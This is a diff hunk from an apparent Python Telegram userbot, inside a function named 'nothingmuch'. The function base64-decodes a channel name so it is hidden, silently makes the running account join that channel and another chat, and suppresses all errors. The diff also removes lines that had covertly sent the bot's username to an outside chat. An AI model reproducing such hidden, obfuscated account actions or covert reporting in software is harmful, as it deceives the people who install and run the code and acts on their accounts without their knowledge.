@@ -77,9 +77,9 @@ async def nothingmuch():
     chcheck = str(pybase64.b64decode("cnVhbmdwcm9qZWN0cw=="))[2:14]
     try:
         await client.join_chat(grcheck)
+    except BaseException:
+        pass
+    try:
         await client.join_chat(chcheck)
-        nah = await app.get_me()
-        ALBYMusic = nah.username
-        await userbot.one.send_message("ruangdiskusikami", f"@{ALBYMusic}")
     except BaseException:
         pass
